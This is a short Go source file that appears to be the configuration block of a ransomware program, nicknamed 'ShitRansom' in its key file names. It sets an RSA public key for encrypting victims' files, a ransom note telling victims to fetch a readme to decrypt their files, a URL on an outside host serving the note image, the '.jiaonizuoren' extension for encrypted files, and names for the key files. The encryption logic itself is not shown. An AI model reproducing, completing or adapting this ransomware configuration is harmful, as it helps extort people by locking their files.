package main

var (
	//	RSA公钥
	pubKey = []byte(`-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDfvXzhRYQhP+RoRTClQUpw7KmY
LnyY8VRjchn0YZRINZ4E9PnsjM6APIkTAXB25doKAfNs94UsX022VHLl80oXRXYC
/8T2Yc3I0rH1+/oNgTS2wag0KWJ2+8H+EoGPE+kXL71Rq4H6DpxdhVAmovp074Zc
5KdgYSwIamzz7yMPsQIDAQAB
-----END PUBLIC KEY-----`)

	//	离线readme设置，如未配置在线下载或下载失败则使用离线readme
	readme         = []byte(`Just smile :) Please download readme file from https://goo.gl/A7lrFT to decrypt your files. `)
	readmeFilename = "README.txt"

	//	在线readme下载设置，留空为不使用
	readmeUrl         = "http://test233.s1001.xrea.com/readme.png"
	readmeNetFilename = "README.png"

	//	运行时的提示信息
	alert = []byte(`plus one second`)

	//	自定义文件后缀名
	filesuffix = ".jiaonizuoren"

	//	key与dkey文件名的设置
	keyFilename  = "ShitRansom.key"
	dkeyFilename = "ShitRansom.dkey"
)
